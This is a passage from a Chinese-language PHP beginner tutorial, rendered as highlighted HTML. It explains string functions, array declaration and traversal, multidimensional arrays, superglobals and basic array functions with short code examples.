title="字符串函数"></a>字符串函数</h3><p>strlen( ) 获取字符串的字节数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;abcdefg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>mb_strlen( ) 获取字符串的字符数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strlen</span>(<span class="string">&#x27;abcdefg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>str_replace( ) 替换字符串&#x2F;&#x2F;‘搜索字符’，’替换内容’，’替换的目标’，’计数器’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$i</span> = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">    <span class="variable">$j</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;eq&#x27;</span>,<span class="variable">$i</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span>);</span><br></pre></td></tr></table></figure><p>file_get_contents( ) 读取文件中的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p>file_put_contents( ) 写入文件中的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;ly.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p>trim( )  函数移除字符串两侧的空白字符或其他预定义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">trim</span>(<span class="string">&#x27;abcdefg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>htmlspecialchars( ) 把一些预定义的字符转换为 HTML 实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;&lt;b&gt;bold&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);<span class="comment">//输出为 &lt;b&gt;bold&lt;/b&gt;</span></span><br></pre></td></tr></table></figure><p>htmlspecialchars_decode( ) 将特殊的 HTML 实体转换回普通字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;&lt;b&gt;bold&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars_decode</span>(<span class="variable">$str</span>);<span class="comment">//输出为加粗后的 bold</span></span><br></pre></td></tr></table></figure><p>md5( ) 计算字符串的 MD5 散列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>password_hash( ) 创建密码的散列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">password_hash</span>(<span class="variable">$str</span>,PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure><p>password_verify( ) 验证密码是否和散列值匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span>=<span class="string">&#x27;$2y$10$3faXxqNQpuqWARzFTpmuN.OWKkP2QBH.CqZ6IJIJTdK8RIB8Ufjlm&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">password_verify</span>(<span class="string">&#x27;abcdefg&#x27;</span>, <span class="variable">$hash</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrev( ) 反转字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>substr( ) 返回字符串的一部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>,<span class="number">2</span>);<span class="comment">//返回bc</span></span><br></pre></td></tr></table></figure><p>str_repeat( ) 把字符串重复指定的次数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$str</span>,<span class="number">3</span>);<span class="comment">//输出3次$str的值</span></span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>是一个能在单量中存储多个数值的特殊变量</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><h3 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h3><p><strong>索引数组：</strong>下标是整数，通常从0下标开始</p><p><strong>关联数组：</strong>下标是字符串</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p><strong>数组名[下标] &#x3D; 值；</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="variable">$arr</span>[<span class="number">0</span>] = <span class="string">&#x27;张三&#x27;</span>;    <span class="comment">// 数字下标 索引数组</span></span><br><span class="line">    <span class="variable">$arr</span>[<span class="number">1</span>] = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="number">2</span>] = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$brr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;李四&#x27;</span>;    <span class="comment">// 字串下标 关联数组</span></span><br><span class="line">    <span class="variable">$brr</span>[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"><span class="variable">$brr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印查看整个数组 </span></span><br><span class="line"><span class="comment">// echo $arr; 报错,显示一个&#x27;Array&#x27; 数组不能被直接echo输出 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>); <span class="comment">// 正确方式 </span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$brr</span>); <span class="comment">// 正确方式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p><strong>数组名 &#x3D; array(  );</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>( <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$brr</span> = <span class="keyword">array</span>( <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">20</span> );    <span class="comment">// 下标为 0  1  2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$crr</span> = <span class="keyword">array</span>( <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;王五&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">21</span>); <span class="comment">// 下标为 name  0  1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><p><strong>数组名 &#x3D; [ ];</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$arr</span> = [ <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span> ];</span><br><span class="line"></span><br><span class="line"><span class="variable">$brr</span> = [ <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;女&#x27;</span>, <span class="number">20</span> ];<span class="comment">// 下标为 0  1  2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$crr</span> = [ <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;王五&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">21</span> ];   <span class="comment">// 下标为 name  0  1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="元素的读取"><a href="#元素的读取" class="headerlink" title="元素的读取"></a>元素的读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [ <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;男&#x27;</span>, <span class="number">18</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 输出 张三 </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// 输出 男 </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// 输出 18 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="数组以及数组元素的删除"><a href="#数组以及数组元素的删除" class="headerlink" title="数组以及数组元素的删除"></a>数组以及数组元素的删除</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$arr</span>  = [ <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span> ];</span><br><span class="line">    <span class="keyword">unset</span>( <span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] );  <span class="comment">// 销毁一个元素</span></span><br><span class="line">    <span class="keyword">unset</span>( <span class="variable">$arr</span> );        <span class="comment">// 销毁整个数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$brr</span> = [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">    <span class="variable">$brr</span>[<span class="number">2</span>] = <span class="literal">null</span>;         <span class="comment">// 删除一个元素</span></span><br><span class="line">    <span class="variable">$brr</span> = <span class="literal">null</span>;            <span class="comment">// 删除整个数组</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他处理"><a href="#其他处理" class="headerlink" title="其他处理"></a>其他处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//使用变量代表下标</span></span><br><span class="line"><span class="variable">$arr</span> = [ <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span> ];</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;name&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$arr</span>[ <span class="variable">$k</span> ];   <span class="comment">// 输出 张三</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[ name ]; <span class="comment">// 报错, 常量未定义, 然后把 name 理解为字符串, 输出张三</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>: 当 [ ] 为空时, 会被理解为 索引下标最大值+1 参看下面代码: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arr</span>[ ] = <span class="string">&#x27;a&#x27;</span>; <span class="comment">// 数组的第1个元素, 所以这个下标为 0 </span></span><br><span class="line">    <span class="variable">$arr</span>[<span class="number">3</span>] = <span class="string">&#x27;b&#x27;</span>; <span class="comment">// 可以指定随意数字做下标, 不一定是 1 </span></span><br><span class="line">    <span class="variable">$arr</span>[ ] = <span class="string">&#x27;c&#x27;</span>; <span class="comment">// 这个元素的下标为 4, 就是最大下标3 + 1 </span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$brr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">    <span class="variable">$brr</span>[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;b&#x27;</span>; </span><br><span class="line">    <span class="variable">$brr</span>[ ] = <span class="number">18</span>; <span class="comment">// 因为 $brr 这个数组之前没有索引下标, 所以这里是 0 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>指对数组中每一个元素,挨个去处理</p><h4 id="方式一：-foreach"><a href="#方式一：-foreach" class="headerlink" title="方式一： foreach"></a>方式一： foreach</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span> )&#123;</span><br><span class="line">      .... </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    $arr  是要遍历的数组</span></span><br><span class="line"><span class="comment">    把数组中每一个元素拿出来  下标(键)    赋值给$k</span></span><br><span class="line"><span class="comment">                          元素(值)    赋值给$v</span></span><br><span class="line"><span class="comment">                            </span></span><br><span class="line"><span class="comment">    换句话讲, $k 和 $v 相当于形参</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="方式二：-for-（遍历索引数组）"><a href="#方式二：-for-（遍历索引数组）" class="headerlink" title="方式二： for  （遍历索引数组）"></a>方式二： for  （遍历索引数组）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$arr</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">count</span>( <span class="variable">$arr</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr</span>[ <span class="variable">$i</span> ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">数组的下标, 必须是连续的索引数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>数组中的元素，还是数组</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$a</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span> = [<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [ <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span> ];  <span class="comment">// 二维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般是下面这样的写法, 不需要$a,$b,$c这三个变量名</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">      [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = [</span><br><span class="line">  [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span>],    </span><br><span class="line">  [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">20</span>],</span><br><span class="line">  [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;王五&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">21</span>],</span><br><span class="line">]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;</span></span><br><span class="line"><span class="string">                &lt;td&gt;<span class="subst">&#123;$v[&#x27;name&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;td&gt;<span class="subst">&#123;$v[&#x27;sex&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;td&gt;<span class="subst">&#123;$v[&#x27;age&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="超全局数组"><a href="#超全局数组" class="headerlink" title="超全局数组"></a>超全局数组</h2><p>超全局, 是指 超越页面, 可以在两个文件之间传递的变量.</p><p><strong>$_GET</strong>       <strong>URL地址</strong>      表单, 超连接get传值</p><p><strong>$_POST</strong>    表单post传值</p><p><strong>$_REQUEST</strong>      包含 $_GET 和 $__POST  </p><p><strong>$_COOKIE</strong>         获取cookie</p><p>**$_SESSION**建立会话</p><p><strong>$_FILES</strong>  获取文件</p><p><strong>$_SERVER</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]      <span class="comment">// 主机名</span></span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]      <span class="comment">// 本服务器IP地址</span></span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]  <span class="comment">// 用户浏览器</span></span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]    <span class="comment">// 根目录的路径</span></span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]      <span class="comment">// 用来指定要访问的页面</span></span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]      <span class="comment">// 浏览当前脚本的用户IP地址</span></span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]     <span class="comment">// 问号后面的检查字符串</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]         <span class="comment">// 文件自己</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h2><p><strong>is_array(  )</strong>    判断变量是否为一个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span>;</span><br></pre></td></tr></table></figure><p><strong>count(  )</strong> 返回数组中元素个数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span>;</span><br></pre></td></tr></table></figure><p><strong>array_values( )</strong>     返回数组中所有的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span 